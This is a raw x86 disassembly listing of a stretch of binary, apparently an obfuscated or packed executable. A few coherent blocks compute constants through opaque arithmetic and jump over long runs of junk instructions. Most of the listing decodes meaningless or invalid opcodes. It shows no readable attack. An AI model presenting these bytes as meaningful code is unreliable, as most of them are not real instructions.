  40dd2e:	loop   0x40dd50
  40dd30:	retf   
  40dd31:	aaa    
  40dd32:	cwde   
  40dd33:	mov    al,ds:0xd0d949d7
  40dd38:	mov    eax,0x717b20cd
  40dd3d:	adc    al,0xf1
  40dd3f:	xor    DWORD PTR [ebp+0x54],ebp
  40dd42:	dec    ecx
  40dd43:	or     al,0xa6
  40dd45:	mov    ebp,0x848625af
  40dd4a:	pusha  
  40dd4b:	sub    esp,ecx
  40dd4d:	clc    
  40dd4e:	xchg   esi,eax
  40dd4f:	mov    dh,0x7a
  40dd51:	cmp    DWORD PTR [esi+eax*8-0x312aacc6],esp
  40dd58:	sbb    BYTE PTR [eax-0x70a20339],dh
  40dd5e:	ror    BYTE PTR [ecx+edi*8+0x1],cl
  40dd62:	shr    DWORD PTR [esi],0xd4
  40dd65:	xor    cl,ch
  40dd67:	cmp    bh,bl
  40dd69:	icebp  
  40dd6a:	and    edx,DWORD PTR [edi-0x79]
  40dd6d:	or     ebp,DWORD PTR [eax+0x9]
  40dd70:	jb     0x40dd11
  40dd72:	ins    BYTE PTR es:[edi],dx
  40dd73:	sar    DWORD PTR [ebx-0x6d1b307a],0x9b
  40dd7a:	and    esp,esi
  40dd7c:	xor    al,0x9d
  40dd7e:	and    esi,eax
  40dd80:	(bad)  
  40dd81:	in     eax,dx
  40dd82:	rcl    bl,1
  40dd84:	mov    ecx,0x10aae83a
  40dd89:	and    eax,0x4aad690a
  40dd8e:	adc    eax,0x972ec440
  40dd93:	adc    al,0xab
  40dd95:	mov    DWORD PTR [edx+0xcaeaf0a],0x2595ebee
  40dd9f:	daa    
  40dda0:	mov    bh,0x9e
  40dda2:	in     eax,dx
  40dda3:	in     eax,0x20
  40dda5:	call   0x4034:0x261b9bcf
  40ddac:	jne    0x40de24
  40ddae:	cmp    bl,BYTE PTR [esi+0x39]
  40ddb1:	daa    
  40ddb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddb3:	dec    ebp
  40ddb4:	add    DWORD PTR [edx-0x45c30e3d],ebx
  40ddba:	fist   WORD PTR [edx]
  40ddbc:	retf   
  40ddbd:	leave  
  40ddbe:	aad    0xef
  40ddc0:	retf   
  40ddc1:	inc    eax
  40ddc2:	xchg   ebx,eax
  40ddc3:	pop    es
  40ddc4:	or     eax,0xe26cb8f1
  40ddc9:	loope  0x40de4a
  40ddcb:	dec    esp
  40ddcc:	call   0x7b5b:0x10591b33
  40ddd3:	and    BYTE PTR [eax+0x152b6fbc],bh
  40ddd9:	mov    esi,0x691dda54
  40ddde:	add    al,0xeb
  40dde0:	push   esi
  40dde1:	aas    
  40dde2:	push   esp
  40dde3:	mov    esp,0x53f4b2e0
  40dde8:	ins    DWORD PTR es:[edi],dx
  40dde9:	stc    
  40ddea:	cmc    
  40ddeb:	outs   dx,BYTE PTR ds:[esi]
  40ddec:	jle    0x40de40
  40ddee:	mov    ah,0x20
  40ddf0:	je     0x40dd85
  40ddf2:	pop    edi
  40ddf3:	dec    edx
  40ddf4:	mov    ebx,0xeaf91a52
  40ddf9:	sub    BYTE PTR [ebp+0x47],0x80
  40ddfd:	pop    es
  40ddfe:	inc    esi
  40ddff:	cdq    
  40de00:	jno    0x40de30
  40de02:	lahf   
  40de03:	in     al,0x2
  40de05:	out    dx,eax
  40de06:	fwait
  40de07:	scas   al,BYTE PTR es:[edi]
  40de08:	in     eax,0x6b
  40de0a:	jp     0x40de12
  40de0c:	jns    0x40ddce
  40de0e:	sbb    ah,BYTE PTR fs:[ebp-0x60]
  40de12:	or     cl,0xb
  40de15:	cs pusha 
  40de17:	mov    dh,0xa4
  40de19:	pop    es
  40de1a:	mov    edi,0x72c6a494
  40de1f:	jp     0x40de57
  40de21:	mov    ch,0xca
  40de23:	inc    edx
  40de24:	mov    al,ds:0x6b8febff
  40de29:	xor    ch,bh
  40de2b:	fdivr  DWORD PTR [esi-0x18]
  40de2f:	or     edx,DWORD PTR [esi]
  40de31:	pop    esp
  40de32:	dec    esi
  40de33:	cmp    edi,ebp
  40de35:	pop    eax
  40de36:	xor    eax,0x8fd9aeda
  40de3b:	pop    edi
  40de3c:	shufps xmm3,XMMWORD PTR [eax-0xd],0x79
  40de41:	cmc    
  40de42:	sub    esi,eax
  40de44:	enter  0x3c36,0x54
  40de48:	test   BYTE PTR [ebx+ebx*1+0x7f],dl
  40de4c:	inc    ebx
  40de4d:	push   ds
  40de4e:	pop    ebp
  40de4f:	in     al,0xee
  40de51:	scas   eax,DWORD PTR es:[di]
  40de53:	addr16 inc edi
  40de55:	hlt    
  40de56:	cld    
  40de57:	fild   WORD PTR [eax-0x31b17430]
  40de5d:	inc    esi
  40de5e:	popf   
  40de5f:	xor    ebx,DWORD PTR [edi+ebp*4]
  40de62:	das    
  40de63:	sub    BYTE PTR [eax-0x5c],bl
  40de66:	mov    ds:0x3e5579bf,eax
  40de6b:	sahf   
  40de6c:	mov    dl,0xad
  40de6e:	push   ebx
  40de6f:	sbb    DWORD PTR [ebx+0x33],edx
  40de72:	or     edi,DWORD PTR [eax+0x172cea61]
  40de78:	leave  
  40de79:	stc    
  40de7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de7b:	jle    0x40de8b
  40de7d:	shr    DWORD PTR [ecx+0x6a732b6],0x7b
  40de84:	shr    eax,cl
  40de86:	inc    ebx
  40de87:	jmp    0x40de71
  40de89:	inc    eax
  40de8a:	push   edx
  40de8b:	add    cl,0x48
  40de8e:	add    esi,DWORD PTR [eax]
  40de90:	and    al,0x55
  40de92:	hlt    
  40de93:	mov    edx,0xd38e5758
  40de98:	adc    BYTE PTR [edi],bl
  40de9a:	mov    edi,0x3356d870
  40de9f:	imul   ebp,eax,0x9
  40dea2:	lods   eax,DWORD PTR ds:[esi]
  40dea3:	scas   eax,DWORD PTR es:[edi]
  40dea4:	ds sbb esi,edx
  40dea7:	push   ds
  40dea8:	adc    DWORD PTR ds:0x4de845c7,edx
  40deae:	push   edx
  40deaf:	add    BYTE PTR [eax],al
  40deb1:	mov    DWORD PTR [ebp-0x14],0x1600
  40deb8:	mov    eax,DWORD PTR [ebp-0x18]
  40debb:	mov    ecx,DWORD PTR [ebp-0x14]
  40debe:	mov    edx,DWORD PTR [ebp-0x10]
  40dec1:	mov    edi,DWORD PTR [ebp-0xc]
  40dec4:	push   edi
  40dec5:	push   edx
  40dec6:	push   ecx
  40dec7:	push   eax
  40dec8:	call   0x41594e
  40decd:	mov    ecx,DWORD PTR [ebp-0x8]
  40ded0:	mov    edi,DWORD PTR [ebp-0x4]
  40ded3:	add    eax,0x1dc8
  40ded8:	adc    edx,0x6fbf
  40dede:	and    edx,edi
  40dee0:	push   0x1061
  40dee5:	and    eax,ecx
  40dee7:	or     edx,0x23ff
  40deed:	push   0x4000022f
  40def2:	or     eax,0x58c4
  40def7:	xor    edx,0x7a7a
  40defd:	xor    eax,0x5278
  40df02:	push   edx
  40df03:	push   eax
  40df04:	call   0x4222a7
  40df09:	jmp    0x40e198
  40df0e:	and    eax,0x8c7544dd
  40df13:	jnp    0x40df51
  40df15:	scas   al,BYTE PTR es:[edi]
  40df16:	fs aam 0x9e
  40df19:	nop
  40df1a:	push   cs
  40df1b:	xchg   BYTE PTR [ebp+ebx*8+0x16],dh
  40df1f:	cld    
  40df20:	mov    esi,0xbec299be
  40df25:	mov    esi,0x8a8fd8d6
  40df2a:	xor    ebx,DWORD PTR [ecx-0x3dd9649e]
  40df30:	out    dx,eax
  40df31:	mov    cs,WORD PTR [ebp+eax*1-0x71]
  40df35:	push   ds
  40df36:	dec    ebp
  40df37:	arpl   WORD PTR [esi-0x2ec2bdb4],si
  40df3d:	in     eax,dx
  40df3e:	leave  
  40df3f:	call   0xf81fa80f
  40df44:	jle    0x40df59
  40df46:	sbb    BYTE PTR [edi-0x1ec53deb],dl
  40df4c:	leave  
  40df4d:	dec    esp
  40df4e:	ins    BYTE PTR es:[edi],dx
  40df4f:	cdq    
  40df50:	dec    esp
  40df51:	in     al,0x57
  40df53:	imul   edx,DWORD PTR [edx-0x50967038],0xcd13f1d6
  40df5d:	jmp    0xa934:0x247615cc
  40df64:	and    eax,0xc2d2fb0a
  40df69:	gs int3 
  40df6b:	jp     0x40df19
  40df6d:	in     eax,0x96
  40df6f:	sub    al,0xd3
  40df71:	enter  0x7f8f,0x39
  40df75:	sbb    BYTE PTR [esi+eax*2],0x32
  40df79:	mov    edi,0x44fd1a7b
  40df7e:	and    BYTE PTR [ecx-0x6a],bl
  40df81:	sbb    al,0xfa
  40df83:	jno    0x40df3f
  40df85:	xchg   ecx,eax
  40df86:	push   cs
  40df87:	mov    edi,0x900ef823
  40df8c:	scas   eax,DWORD PTR es:[edi]
  40df8d:	das    
  40df8e:	mov    cl,0x0
  40df90:	nop
  40df91:	scas   eax,DWORD PTR es:[edi]
  40df92:	cmp    BYTE PTR [eax],cl
  40df94:	jae    0x40df82
  40df96:	push   esp
  40df97:	add    al,0x94
  40df99:	dec    esi
  40df9a:	mov    cs,WORD PTR [eax-0x2e]
  40df9d:	mov    al,ds:0x6194781b
  40dfa2:	(bad)  [edi]
  40dfa4:	ficomp DWORD PTR [eax+0x19654982]
  40dfaa:	hlt    
  40dfab:	xchg   edx,eax
  40dfac:	sub    eax,0xbf8386d1
  40dfb1:	cmp    BYTE PTR [ebx+edi*8-0x68],bl
  40dfb5:	pop    esi
  40dfb6:	mov    ah,0x3c
  40dfb8:	xor    BYTE PTR [edi],al
  40dfba:	dec    ebp
  40dfbb:	aad    0xf0
  40dfbd:	and    DWORD PTR [esi],0x13
  40dfc0:	popf   
  40dfc1:	xor    dh,BYTE PTR [ecx+0x6a]
  40dfc4:	loop   0x40dfd6
  40dfc6:	loope  0x40df58
  40dfc8:	loopne 0x40df9f
  40dfca:	mov    ebx,0xe005a7a8
  40dfcf:	add    DWORD PTR [ebx-0x697ff698],0x1b
  40dfd6:	fstp   QWORD PTR [ebp-0x5ff9b26b]
  40dfdc:	in     al,dx
  40dfdd:	sbb    ecx,DWORD PTR [edi-0x13dea22b]
  40dfe3:	dec    edx
  40dfe4:	std    
  40dfe5:	inc    edx
  40dfe6:	call   0xd00c75fd
  40dfeb:	inc    ebx
  40dfec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfed:	xchg   bh,dl
  40dfef:	sbb    ah,ch
  40dff1:	aaa    
  40dff2:	retf   0x6b39
  40dff5:	push   ss
  40dff6:	hlt    
  40dff7:	sub    BYTE PTR [esi+0x62d605e2],dl
  40dffd:	sub    dl,BYTE PTR [edi+0x2d1e2187]
  40e003:	pop    ebp
  40e004:	das    
  40e005:	fadd   DWORD PTR [ebx+0x7b]
  40e008:	push   ss
  40e009:	mov    eax,0xb27636d0
  40e00e:	xchg   ecx,eax
  40e00f:	out    0x1,al
  40e011:	mov    eax,0x1e9c86da
  40e016:	(bad)  
  40e017:	cmc    
  40e018:	call   0xa901c52c
  40e01d:	rcr    DWORD PTR [edx-0x6409ff84],0x8c
  40e024:	pop    ss
  40e025:	dec    esi
  40e026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e027:	push   ds
  40e028:	popa   
  40e029:	add    ebp,eax
  40e02b:	xor    edi,DWORD PTR [esi-0x60c98351]
  40e031:	jecxz  0x40e0af
  40e033:	ins    BYTE PTR es:[edi],dx
  40e034:	nop
  40e035:	pop    edx
  40e036:	icebp  
  40e037:	jmp    0x40dff9
  40e039:	sbb    cl,BYTE PTR [eax]
  40e03b:	nop
  40e03c:	pop    eax
  40e03d:	aas    
  40e03e:	inc    esi
  40e03f:	pop    esp
  40e040:	jg     0x40e0b1
  40e042:	pop    eax
  40e043:	fist   WORD PTR [edx-0x6e9015b1]
  40e049:	pop    esi
  40e04a:	pop    ebp
  40e04b:	sahf   
  40e04c:	mov    ?,WORD PTR [eax+0x3c9a431f]
  40e052:	outs   dx,BYTE PTR ds:[esi]
  40e053:	cmp    bp,sp
  40e056:	idiv   DWORD PTR [edx-0x58]
  40e059:	xchg   BYTE PTR [edi],ah
  40e05b:	mov    al,0xc2
  40e05d:	pop    es
  40e05e:	and    edx,eax
  40e060:	push   es
  40e061:	sub    al,0xf5
  40e063:	sub    eax,DWORD PTR [ecx-0x1b4f616f]
  40e069:	and    dl,BYTE PTR [ecx+esi*2+0x773067bb]
  40e070:	cmp    dh,BYTE PTR [eax+ecx*2]
  40e073:	mov    ch,0x69
  40e075:	stos   DWORD PTR es:[edi],eax
  40e076:	stos   BYTE PTR es:[edi],al
  40e077:	mov    edx,0xf4970f1b
  40e07c:	test   BYTE PTR [edi-0x18],bh
  40e07f:	(bad)  
  40e080:	adc    eax,0xaee506c1
  40e085:	and    esi,edx
  40e087:	cdq    
  40e088:	jns    0x40e07e
  40e08a:	xchg   edi,eax
  40e08b:	imul   esp,DWORD PTR [edi-0x124e7fc2],0xbea6fd81
  40e095:	pop    ecx
  40e096:	xor    al,0x7c
  40e098:	int    0x1
  40e09a:	hlt    
  40e09b:	sti    
  40e09c:	js     0x40e048
  40e09e:	ror    DWORD PTR [edi+0x2a],cl
  40e0a1:	stos   DWORD PTR es:[edi],eax
  40e0a2:	int3   
  40e0a3:	xlat   BYTE PTR ds:[ebx]
  40e0a4:	in     eax,dx
  40e0a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0a6:	test   BYTE PTR [ecx+edx*8],bl
  40e0a9:	sbb    edi,DWORD PTR [esi+eiz*1]
  40e0ac:	(bad)  [ecx]
  40e0ae:	or     eax,0x7492c484
  40e0b3:	fwait
  40e0b4:	and    BYTE PTR [ecx-0x6c0a8971],bh
  40e0ba:	cmp    al,0x68
  40e0bc:	cmp    eax,0x14e92633
  40e0c1:	inc    ecx
  40e0c2:	ss mov al,0xea
  40e0c5:	dec    edi
  40e0c6:	sbb    BYTE PTR [edx],bl
  40e0c8:	xor    al,0x65
  40e0ca:	push   ecx
  40e0cb:	dec    eax
  40e0cc:	mov    ebx,0xe5c32f45
  40e0d1:	push   es
  40e0d2:	pop    edi
  40e0d4:	push   ds
  40e0d5:	jae    0x40e0e1
  40e0d7:	adc    BYTE PTR [edx+0x3609dda1],dh
  40e0dd:	pushf  
  40e0de:	cmp    ah,bl
  40e0e0:	(bad)  
  40e0e1:	fadd   QWORD PTR [ebp+0x68]
  40e0e4:	popa   
  40e0e5:	inc    edi
  40e0e6:	jg     0x40e0c8
  40e0e8:	xchg   esp,eax
  40e0e9:	rcl    BYTE PTR [ecx],1
  40e0eb:	xchg   DWORD PTR [esi-0x2d],esi
  40e0ee:	dec    esi
  40e0ef:	in     al,0x28
  40e0f1:	jp     0x40e0db
  40e0f3:	and    al,0xd2
  40e0f5:	dec    esi
  40e0f6:	push   edx
  40e0f7:	xor    eax,0x2f222292
  40e0fc:	lods   al,BYTE PTR ds:[esi]
  40e0fd:	xlat   BYTE PTR ds:[ebx]
  40e0fe:	fadd   QWORD PTR [ebx+eax*1]
  40e101:	xor    al,BYTE PTR [esi+0x117a95f6]
  40e107:	loop   0x40e123
  40e109:	lahf   
  40e10a:	sbb    eax,0xde45a6f4
  40e10f:	dec    ebp
  40e110:	lock push ds
  40e112:	xor    eax,0xcd9b5cef
  40e117:	dec    ecx
  40e118:	leave  
  40e119:	sbb    DWORD PTR [ebp+0x39],edx
  40e11c:	call   0xe3e5:0x8af964d8
  40e123:	mov    bh,0xd2
  40e125:	dec    BYTE PTR [edx+0x0]
  40e128:	mov    esi,0xa765117a
  40e12d:	fwait
  40e12e:	or     edx,DWORD PTR [ebx]
  40e130:	mov    bl,0xde
  40e132:	shl    esi,1
  40e134:	dec    esp
  40e135:	adc    eax,DWORD PTR [edx+0x6b]
  40e138:	or     DWORD PTR [ebx+0x71],edi
  40e13b:	gs popa 
  40e13d:	xor    eax,0x263286b
  40e142:	mov    dl,0xe2
  40e144:	dec    esi
  40e145:	jmp    0x1ffb:0x33d389ca
  40e14c:	ret    
  40e14d:	pusha  
  40e14e:	int3   
  40e14f:	dec    esi
  40e150:	mov    ah,0xa3
  40e152:	xchg   ecx,eax
  40e153:	add    al,0xdd
  40e155:	bound  esi,QWORD PTR [edi+0x6d]
  40e158:	ja     0x40e173
  40e15a:	sub    ecx,edi
  40e15c:	lea    esi,[esp+ebx*1-0x5e]
  40e160:	in     eax,0x29
  40e162:	imul   eax,DWORD PTR [eax+0x5c0479a5],0xf685685d
  40e16c:	in     al,dx
  40e16d:	scas   al,BYTE PTR es:[edi]
  40e16e:	call   0xb631:0xd59bda66
  40e175:	jmp    0x39f778df
  40e17a:	sti    
  40e17b:	jb     0x40e1cd
  40e17d:	sub    edx,ebp
  40e17f:	into   
  40e180:	and    BYTE PTR [ebp+0x5460dda1],dl
  40e186:	rep ins BYTE PTR es:[edi],dx
  40e188:	retf   0x4769
  40e18b:	add    esi,DWORD PTR [edi+0x3c76cf1b]
  40e191:	or     eax,DWORD PTR [ebx]
  40e193:	xchg   esi,eax
  40e194:	jo     0x40e121
  40e196:	jmp    0xe045:0xc7068978
  40e19d:	push   esp
  40e19e:	xor    eax,DWORD PTR [eax]
  40e1a0:	add    bh,al
  40e1a2:	inc    ebp
  40e1a3:	in     al,0x8c
  40e1a5:	jge    0x40e1a7
  40e1a7:	add    bh,al
  40e1a9:	inc    ebp
  40e1aa:	call   0x411ee5
  40e1af:	mov    DWORD PTR [ebp-0x14],0x51ef
  40e1b6:	xor    edi,edi
  40e1b8:	mov    DWORD PTR [ebp-0xc],0x3358
  40e1bf:	push   0xc9f
  40e1c4:	jmp    0x40e453
  40e1c9:	jecxz  0x40e232
  40e1cb:	fscale 
  40e1cd:	pop    edx
  40e1ce:	mov    ah,0x3c
  40e1d0:	lods   al,BYTE PTR ds:[esi]
  40e1d1:	je     0x40e1fd
  40e1d3:	push   eax
  40e1d4:	sahf   
  40e1d5:	xchg   ecx,eax
  40e1d6:	(bad)  
  40e1d7:	or     al,0x92
  40e1d9:	icebp  
  40e1da:	add    bh,BYTE PTR [esi-0x413d6642]
  40e1e0:	mov    esi,0xdceed1c8
  40e1e5:	add    ah,BYTE PTR [esi+edi*2+0x65]
  40e1e9:	ja     0x40e242
  40e1eb:	mov    BYTE PTR [ebx+0x2e],bl
  40e1ee:	ret    0xc75f
  40e1f1:	jns    0x40e200
  40e1f3:	es pop ecx
  40e1f5:	inc    esp
  40e1f6:	in     eax,0xc3
  40e1f8:	mov    bh,0x91
  40e1fa:	fninit 
  40e1fc:	fdivr  st,st(4)
  40e1fe:	jno    0x40e249
  40e200:	sub    al,0xb0
  40e202:	lds    eax,FWORD PTR [edx]
  40e204:	mov    eax,ds:0xfe407519
  40e209:	xlat   BYTE PTR ds:[ebx]
  40e20a:	xchg   edi,eax
  40e20b:	push   0xc51413ec
  40e210:	dec    edx
  40e211:	ins    DWORD PTR es:[edi],dx
  40e212:	jecxz  0x40e262
  40e214:	sub    al,0xf5
  40e216:	ficomp WORD PTR [ebx]
  40e218:	hlt    
  40e219:	inc    esp
  40e21a:	ror    DWORD PTR [ebx+0x48edd2c1],cl
  40e220:	mov    edx,0xb38b9d44
  40e225:	xor    eax,0xfb50ddcb
  40e22a:	add    cl,cl
  40e22c:	add    BYTE PTR [ebp+ebp*2-0x1305b976],dl
  40e233:	ja     0x40e258
  40e235:	cmc    
  40e236:	pop    es
  40e237:	div    DWORD PTR [ecx]
  40e239:	ss out 0x19,eax
  40e23c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e23d:	inc    ecx
  40e23e:	mov    DWORD PTR [edi-0x1e5634b],edi
  40e244:	call   0x34cf0a83
  40e249:	inc    ebx
  40e24a:	xchg   ah,ch
  40e24c:	sub    bh,bl
  40e24e:	inc    edi
  40e24f:	clc    
  40e250:	adc    DWORD PTR [ebx+0x5c],eax
  40e253:	inc    esp
  40e254:	mov    ebp,0xbb90772e
  40e259:	out    dx,al
  40e25a:	fild   DWORD PTR [eax]
  40e25c:	and    ebx,esi
  40e25e:	dec    esi
  40e25f:	adc    al,0x1
  40e261:	mov    dh,BYTE PTR [ebx]
  40e263:	inc    edx
  40e264:	sbb    eax,0x301765fb
  40e269:	stc    
  40e26a:	loop   0x40e1ef
  40e26c:	jae    0x40e26b
  40e26e:	add    bl,BYTE PTR [edx+esi*4-0x2c]
  40e272:	jp     0x40e2a3
  40e274:	mov    ?,WORD PTR [edi]
  40e276:	jo     0x40e2b5
  40e278:	aas    
  40e279:	push   ebx
  40e27a:	adc    esi,esi
  40e27c:	cdq    
  40e27d:	inc    ebp
  40e27e:	xor    dl,dh
  40e280:	mov    ebx,0xd7c605e4
  40e285:	out    dx,al
  40e286:	push   ds
  40e287:	jecxz  0x40e2bc
  40e289:	retf   
  40e28a:	das    
  40e28b:	xchg   BYTE PTR [edx-0x14],bl
  40e28e:	icebp  
  40e28f:	cmp    DWORD PTR [ebp-0x62],eax
  40e292:	inc    esi
  40e293:	pop    esp
  40e294:	aad    0xec
  40e296:	adc    al,bl
  40e298:	data16 mov bh,0x19
  40e29b:	sbb    ebx,DWORD PTR [esi+eax*2+0x3f]
  40e29f:	push   es
  40e2a0:	loope  0x40e26d
  40e2a2:	and    esi,ebx
  40e2a4:	shl    DWORD PTR [ecx+0x6ec3cb25],cl
  40e2aa:	in     al,0x5a
  40e2ac:	lahf   
  40e2ad:	adc    al,BYTE PTR [edx]
  40e2af:	frstor [ecx+esi*8]
  40e2b2:	mov    WORD PTR [ebx+0x5b],es
  40e2b5:	inc    esi
  40e2b6:	sub    eax,0x6125f2a9
  40e2bb:	add    eax,0x9595b71e
  40e2c0:	and    edi,edi
  40e2c2:	sbb    dl,bh
  40e2c4:	sar    DWORD PTR [edx+0x57080160],0x2e
  40e2cb:	fcomp  DWORD PTR [esi+0x6e]
  40e2ce:	pushf  
  40e2cf:	test   BYTE PTR [ecx-0x72],0x22
  40e2d3:	jl     0x40e2f3
  40e2d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2d6:	adc    eax,0x2572a690
  40e2db:	pushf  
  40e2dc:	xor    DWORD PTR [ebx+0x608bc30d],edx
  40e2e2:	out    0x5b,al
  40e2e4:	xor    eax,0xebe63075
  40e2e9:	pop    ebx
  40e2ea:	mov    esp,0x34c18ba9
  40e2ef:	pusha  
  40e2f0:	pop    ecx
  40e2f1:	cmp    esp,0x4c
  40e2f4:	stc    
  40e2f5:	inc    esi
  40e2f6:	call   0xb838dcd8
  40e2fb:	hlt    
  40e2fc:	inc    edx
  40e2fd:	call   0x178c:0xb3009302
  40e304:	lods   al,BYTE PTR ds:[esi]
  40e305:	shl    DWORD PTR [edi-0x6f],0x65
  40e309:	mov    ebp,ebx
  40e30b:	imul   DWORD PTR [ebx+eax*2+0x4f]
  40e30f:	push   cs
  40e310:	pop    ecx
  40e311:	sbb    bl,BYTE PTR [esi-0x447b6c07]
  40e317:	mov    ebp,0x35dbbf4c
  40e31c:	repz ret 
  40e31e:	aad    0x9c
  40e320:	cmp    al,0xc5
  40e322:	or     BYTE PTR [ecx+edi*4-0x6],dl
  40e326:	mov    bl,0x84
  40e328:	ins    BYTE PTR es:[edi],dx
  40e329:	sbb    esp,DWORD PTR [ebp+0xe]
  40e32c:	xor    eax,0xfe118b78
  40e331:	mov    BYTE PTR [eax],ah
  40e333:	int3   
  40e334:	jno    0x40e2ce
  40e336:	xchg   edx,eax
  40e337:	jmp    0x15c1:0x77d5db71
  40e33e:	jg     0x40e2ec
  40e340:	pop    ebp
  40e341:	ret    0x481b
  40e344:	cdq    
  40e345:	push   sp
  40e347:	daa    
  40e348:	les    esi,FWORD PTR ds:0x3662df55
  40e34e:	sub    al,0x21
  40e350:	fst    QWORD PTR [edi]
  40e352:	inc    esi
  40e353:	and    ah,cl
  40e355:	mov    ebp,0x3a96b1c5
  40e35a:	add    cl,BYTE PTR [edx-0x42a1c161]
  40e360:	add    DWORD PTR [edx-0x78],ebp
  40e363:	fwait
  40e364:	push   ecx
  40e365:	fdiv   QWORD PTR [edi+0x1f047d3e]
  40e36b:	jmp    0x4d11:0x199bcb8b
  40e372:	aaa    
  40e373:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e374:	xchg   BYTE PTR [eax],bl
  40e376:	gs dec edx
  40e378:	scas   al,BYTE PTR es:[edi]
  40e379:	sahf   
  40e37a:	bound  edi,QWORD PTR [edx*1+0x1d7d344e]
  40e381:	daa    
  40e382:	xor    BYTE PTR [esi-0x3351daa9],ah
  40e388:	push   es
  40e389:	jle    0x40e3bd
  40e38b:	sahf   
  40e38c:	mov    ecx,0x43648727
  40e391:	lahf   
  40e392:	mov    eax,ds:0xee552c0a
  40e397:	xchg   esi,eax
  40e398:	aas    
  40e399:	cmp    eax,0xb95ecd01
  40e39e:	pop    esi
  40e39f:	jecxz  0x40e3f6
  40e3a1:	(bad)  
  40e3a3:	fldenv [ebp+ebp*1+0x35]
  40e3a7:	mov    ebp,DWORD PTR [esi+0x865eda0]
  40e3ad:	fimul  DWORD PTR ds:0x70a31eeb
  40e3b3:	sbb    DWORD PTR ds:0xc017c4e2,eax
  40e3b9:	push   edi
  40e3ba:	dec    ecx
  40e3bb:	ins    DWORD PTR es:[edi],dx
  40e3bc:	jmp    0x40e3f9
  40e3be:	or     dl,dl
  40e3c0:	popf   
  40e3c1:	lds    eax,FWORD PTR [edx]
  40e3c3:	jecxz  0x40e3c4
  40e3c5:	(bad)  
  40e3c6:	push   edi
  40e3c7:	loopne 0x40e42b
  40e3c9:	pop    esp
  40e3ca:	dec    ecx
  40e3cb:	mov    esp,edi
  40e3cd:	into   
  40e3ce:	cmp    dl,0xf7
  40e3d1:	clc    
  40e3d2:	and    eax,0xef2297b4
  40e3d7:	sti    
  40e3d8:	popa   
  40e3d9:	pop    ebx
  40e3da:	fadd   st,st(6)
  40e3dc:	int    0x38
  40e3de:	or     eax,0x67c5954a
  40e3e3:	leave  
  40e3e4:	mov    ah,0x8d
  40e3e6:	sub    BYTE PTR ds:0x348bacfb,ch
  40e3ec:	les    edi,FWORD PTR [ebp-0x396fdcec]
  40e3f2:	add    bh,dl
  40e3f4:	idiv   DWORD PTR [eax-0x6]
  40e3f7:	cmc    
  40e3f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3f9:	push   ecx
  40e3fa:	inc    ebx
  40e3fb:	shr    ah,0xf9
  40e3fe:	retf   
  40e3ff:	inc    eax
  40e400:	stos   BYTE PTR es:[edi],al
  40e401:	push   ebp
  40e402:	cmp    BYTE PTR [edx],ch
  40e404:	mov    eax,0x7b8c8b9a
  40e409:	and    eax,0x690697a8
  40e40e:	repz (bad) 
  40e410:	jbe    0x40e439
  40e412:	mov    eax,0xd694c73a
  40e417:	sbb    edx,eax
  40e419:	or     DWORD PTR [ebx+0x8],0x6256ce7f
  40e420:	jmp    0xcf8dec8b
  40e425:	jmp    0x40e45e
  40e427:	sbb    ecx,DWORD PTR [ecx+0x12]
  40e42a:	int3   
  40e42b:	popa   
  40e42c:	push   ebp
  40e42d:	(bad)  
  40e42e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e42f:	mov    esi,ss
  40e431:	add    al,0x82
  40e433:	sbb    bh,0x20
  40e436:	enter  0xf756,0x82
  40e43a:	loop   0x40e459
  40e43c:	aaa    
  40e43d:	rol    ch,cl
  40e43f:	push   ds
  40e440:	inc    eax
  40e441:	jl     0x40e43e
  40e443:	or     DWORD PTR [edx-0x17],eax
  40e446:	jae    0x40e3f6
  40e448:	and    bh,BYTE PTR [edi]
  40e44a:	push   0x87120361
  40e44f:	imul   ecx,DWORD PTR [edx+edx*1+0x22],0x47
  40e454:	mov    DWORD PTR [ebp-0x4],edi
  40e457:	mov    eax,DWORD PTR [ebp-0x18]
  40e45a:	mov    ecx,DWORD PTR [ebp-0x14]
  40e45d:	push   0x1c19
  40e462:	push   ecx
  40e463:	push   eax
  40e464:	call   0x41594e
  40e469:	mov    ecx,DWORD PTR [ebp-0x20]
  40e46c:	mov    ebx,DWORD PTR [ebp-0x1c]
  40e46f:	or     eax,ecx
  40e471:	or     edx,ebx
  40e473:	push   0x20fa
  40e478:	add    eax,0x7fac
  40e47d:	push   0x1cd48ab
  40e482:	adc    edx,0x133b
  40e488:	push   edx
  40e489:	push   eax
  40e48a:	call   0x4222a7
  40e48f:	mov    ebx,DWORD PTR [ebp-0x4]
  40e492:	lea    ecx,[eax-0x5d40]
  40e498:	xor    edx,edx
  40e49a:	mov    eax,0x16c2
  40e49f:	div    ebx
  40e4a1:	mov    edx,DWORD PTR [ebp-0xc]
  40e4a4:	sub    eax,edx
  40e4a6:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  40e4ad:	mov    DWORD PTR [ebp-0x14],0x6af0
  40e4b4:	mov    DWORD PTR [ebp-0x4],edi
  40e4b7:	mov    DWORD PTR [ebp-0xc],0x2c8a
  40e4be:	mov    ecx,DWORD PTR [ebp-0xc]
  40e4c1:	mov    eax,0x4401
  40e4c6:	sub    eax,ecx
  40e4c8:	mov    ecx,DWORD PTR [ebp-0x4]
  40e4cb:	xor    edx,edx
  40e4cd:	div    ecx
  40e4cf:	mov    ecx,DWORD PTR [ebp-0x14]
  40e4d2:	xor    eax,0xa80
  40e4d7:	or     eax,0x343b
  40e4dc:	or     eax,ecx
  40e4de:	mov    ecx,DWORD PTR [ebp+0x8]
  40e4e1:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  40e4e8:	mov    DWORD PTR [ebp-0xc],0x327f
  40e4ef:	mov    DWORD PTR [ebp-0x14],0x5215
  40e4f6:	mov    DWORD PTR [ebp+0x8],0x2502
  40e4fd:	mov    eax,DWORD PTR [ebp+0x8]
  40e500:	add    eax,DWORD PTR [ebp-0x14]
